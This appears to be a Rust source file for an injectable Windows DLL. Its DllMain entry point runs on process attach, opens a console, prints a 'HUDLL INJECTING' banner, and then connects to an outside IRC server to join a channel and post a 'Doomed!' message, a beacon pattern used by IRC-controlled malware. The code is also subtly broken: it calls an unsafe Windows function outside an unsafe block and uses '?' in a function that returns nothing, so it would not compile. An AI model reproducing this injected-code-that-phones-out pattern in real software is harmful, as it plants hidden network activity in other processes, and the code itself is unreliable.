#![cfg(windows)]

use std::{
    io::{self, Write},
    net::{TcpStream},
    ffi::CString,
};
use winapi::{
    um::{
        consoleapi::{AllocConsole, WriteConsoleA},
        winbase::STD_OUTPUT_HANDLE,
        wincon::{CONSOLE_TEXTMODE_BUFFER, COORD, SMALL_RECT},
        processenv::GetStdHandle,
    },
    shared::minwindef::{self, BOOL, DWORD, HINSTANCE, LPVOID},
    ctypes::c_void,
};

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(
    dll_module: HINSTANCE, 
    call_reason: DWORD, 
    reserved: LPVOID) 
    -> BOOL 
{
    const DLL_PROCESS_ATTACH: DWORD = 1;
    const DLL_PROCESS_DETACH: DWORD = 0;

    match call_reason {
        DLL_PROCESS_ATTACH => InjectDll(),
        DLL_PROCESS_DETACH => (),
        _ => ()
    }

    minwindef::TRUE
}

#[allow(non_snake_case)]
fn InjectDll() {
    unsafe { AllocConsole() };

    let handle = GetStdHandle(STD_OUTPUT_HANDLE);

    let message = CString::new
    ("\n
    ██╗░░██╗██╗░░░██╗██████╗░██╗░░░░░██╗░░░░░
    ██║░░██║██║░░░██║██╔══██╗██║░░░░░██║░░░░░
    ███████║██║░░░██║██║░░██║██║░░░░░██║░░░░░
    ██╔══██║██║░░░██║██║░░██║██║░░░░░██║░░░░░
    ██║░░██║╚██████╔╝██████╔╝███████╗███████╗
    ╚═╝░░╚═╝░╚═════╝░╚═════╝░╚══════╝╚══════╝
    ██╗███╗░░██╗░░░░░██╗███████╗░█████╗░████████╗██╗███╗░░██╗░██████╗░
    ██║████╗░██║░░░░░██║██╔════╝██╔══██╗╚══██╔══╝██║████╗░██║██╔════╝░
    ██║██╔██╗██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░██║██╔██╗██║██║░░██╗░
    ██║██║╚████║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░██║██║╚████║██║░░╚██╗
    ██║██║░╚███║╚█████╔╝███████╗╚█████╔╝░░░██║░░░██║██║░╚███║╚██████╔╝
    ╚═╝╚═╝░░╚══╝░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝░╚═════╝░
    ").unwrap();

    let mut written: u32 = 0;

    unsafe {
        WriteConsoleA(
            handle,
            message.as_ptr() as *const c_void,
            message.as_bytes().len() as u32,
            &mut written,
            std::ptr::null_mut(),
        );
    }

    SendPayloadFromDll()?;
}

#[allow(non_snake_case)]
fn SendPayloadFromDll() -> io::Result<()> {
    let host = "irc.freenode.net:6667";
    let tcp_stream = TcpStream::connect(host)?;
    let mut writer = io::BufWriter::new(tcp_stream);
    let payload = 
        b"USER yourdoom 0 * :realname\nNICK yourdoom\nJOIN #yourchannel\nPRIVMSG #yourchannel :Doomed! (Rust style) \n";
    writer.write_all(payload)?;
    writer.flush()?;
    Ok(())
}